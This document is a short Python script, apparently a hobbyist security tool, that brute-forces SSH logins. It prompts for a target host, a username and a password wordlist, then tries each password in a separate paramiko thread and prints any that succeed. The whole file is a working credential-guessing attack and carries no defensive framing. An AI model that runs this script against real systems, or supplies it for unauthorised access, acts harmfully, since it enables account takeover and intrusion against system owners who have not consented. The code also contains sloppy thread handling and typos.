#!/bin/python3
import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

def   ssh_connect(password):
      global stop_flag
      ssh = paramiko.SSHClient()
      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      
      try:
      	  ssh.connect(host, port=22, username=username, password=password)
      	  stop_flag = 1
      	  print(termcolor.colored((' [+] Found Password: ' + password + ', For Account: ' + username), 'green'))
      except:
      	  print(termcolor.colored((' [-] Incorrect Login: ' + password), 'red'))
      ssh.close()
      
           
       
host = input(' [+] Target Address: ')
username = input(' [+] SSH Unsername: ')
input_file = input(' [+] Password file: ')
print('\n')


if os.path.exists(input_file) == False:
	print(' [!!!] That file/path does not exist: ')
	sys.exit(1)
	
#Print('*** Starting Thread SSH Bruteforce on' + host + 'With Account:' + username + ' * * * ')
	
with open(input_file, 'r') as file:
	for line in file.readlines():
		if stop_flag == 1:
		    t.join()
		    exit()
		password = line.strip()
		t = threading.Thread(target=ssh_connect, args=(password, ))
		t.start()
		time.sleep(0.5)
		